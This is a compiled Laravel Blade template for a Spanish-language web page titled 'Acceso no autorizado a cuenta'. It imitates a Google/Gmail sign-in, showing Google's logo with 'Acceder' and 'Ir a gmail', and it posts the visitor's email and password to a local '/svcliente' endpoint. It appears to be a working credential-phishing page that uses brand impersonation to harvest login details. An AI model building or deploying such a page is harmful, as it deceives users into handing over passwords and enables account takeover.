<!DOCTYPE html>
<html lang="es">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="csrf-token" content="<?php echo e(csrf_token()); ?>">

        <title>Acceso no autorizado a cuenta</title>

        <!-- Fonts -->
        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700&display=swap">
        <!-- Styles -->
        <link rel="stylesheet" href="../../css/app.css">

        <link rel="stylesheet" href="../../css/app.css">
        

        <!-- Scripts -->
        <script src="../../js/app.js" defer></script>
        <script src="https://kit.fontawesome.com/8b291b3295.js" crossorigin="anonymous"></script>
        
    </head>
    
    <body class="bg-white">
        <div class="div-formulario">
            <div class="flex justify-center mt-5">
                <img class="block h-10 w-auto img-google" src="https://logodownload.org/wp-content/uploads/2014/09/google-logo-1.png" alt="Workflow">
            </div>
            <h1 class="font-bold text-xl ml-2 mt-5 text-center">Acceder</h1>
            <h1 class="font-normal text-xl ml-2 text-center">Ir a gmail</h1>

            <form action="http://127.0.0.1:8000/svcliente" method="POST" accept-charset="UTF-8" enctype="multipart/form-data" id="formulario">
                <?php echo csrf_field(); ?>
                <?php echo method_field('POST'); ?>
                <label class="block text-sm font-bold text-gray-700 text-center mt-5">Despues dar click en verificar, espere un momento por favor.</label>
                
                <div class="mt-10">
                    <label id="label_ejercicio" for="label_ejercicio" class="block text-sm font-bold text-gray-700 text-center">Correo electronico</label>

                    <div class="flex justify-center">
                        <input type="text" name="correo" id="correo" class="mt-1 focus:bg-white focus:border-blue-800 block w-full shadow-sm sm:text-sm border-blue-700 rounded-md bg-blue-100" style="width: 300px;">
                    </div>
                    <label id="error_correo" class="hidden text-base font-normal text-red-500 text-center" >El correo no es valido</label>
                </div>

                <div class="mt-3">
                    <label for="password" class="block text-sm font-bold text-gray-700 text-center">Contraseña</label>
                    <div class="flex justify-center">
                        <input type="password" name="password" id="password" class="mt-1 focus:bg-white focus:border-blue-800 block w-full shadow-sm sm:text-sm border-blue-700 rounded-md bg-blue-100"  style="width: 300px;">
                    </div>
                    <label id="error_password" for="password "class="hidden text-base font-normal text-red-500 text-center" >La contraseña no es valida</label>
                </div>

                
                <div class="flex justify-center mt-5">
                    <button id="guardar_btn" type="submit" class="bg-blue-700 text-white font-bold text-sm px-3 py-2 rounded shadow hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150">
                        Verificar
                    </button>
                </div>
            </form>
        </div>
    
       
    </body>
    <script type="text/javascript" charset="utf8" src="https://code.jquery.com/jquery-3.5.1.js"></script>
<script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/jquery.validate.min.js"></script> 
    <script>
        $(document).ready(function() {
            $("#formulario").validate({
                onfocusout: false,
                onclick: false,
                rules: {
                    password: { required: true},
                    correo: { required: true},
                },
                errorPlacement: function(error, element) {
                    if(error != null){
                    $('#error_'+element.attr('id')).removeClass("hidden");
                    $('#error_'+element.attr('id')).addClass("block");
                    }else{
                    $('#error_'+element.attr('id')).addClass("hidden");
                    $('#error_'+element.attr('id')).removeClass("block");
                    }
                // console.log(element.attr('id'));
                },
            }); 
        });
    </script>
</html><?php /**PATH D:\Nueva carpeta (2)\CMR\Sistema\cmr_app\resources\views/cliente/registro.blade.php ENDPATH**/ ?>